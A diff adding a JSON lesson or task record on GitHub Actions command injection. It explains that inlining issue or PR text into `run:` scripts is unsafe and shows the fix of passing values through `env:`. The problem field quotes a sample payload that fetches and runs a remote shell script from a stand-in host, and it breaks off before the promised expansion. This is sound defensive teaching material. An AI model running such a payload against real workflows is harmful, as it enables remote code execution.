@@ -1,0 +1,12 @@
+{
+  "task_id": "lesson-github-actions-code-injection",
+  "title": "Github Actions Code Injection",
+  "domain": "general",
+  "tags": [
+    "general"
+  ],
+  "problem": "When GitHub Actions `run:` scripts directly interpolate user-controlled context variables like `${{ github.event.issue.body }}` or `${{ github.event.pull_request.title }}`, attackers can inject arbitrary commands by crafting issue/PR content containing shell metacharacters (e.g., `` ` ``, `$(...)`, `;`).\n\n\n\nIf the issue body is `\"$(curl http://evil/payload.sh | sh)\"`, after expansion it becomes:",
+  "solution": "Pass user-controlled context variables through `env:` instead of inlining them in `run:` scripts:\n\n```yaml\n# SAFE: pass via env variable\n- run: |\n    echo \"$ISSUE_BODY\" | grep \"keyword\"\n  env:\n    ISSUE_BODY: ${{ github.event.issue.body }}\n```\n\nGitHub Actions evaluates `${{ }}` expressions in `env:` blocks and writes the result as an environment variable value. The shell does not perform secondary parsing on special characters within the value.",
+  "source": "lessons/en/github-actions-code-injection.md",
+  "test_cmd": ""
+}
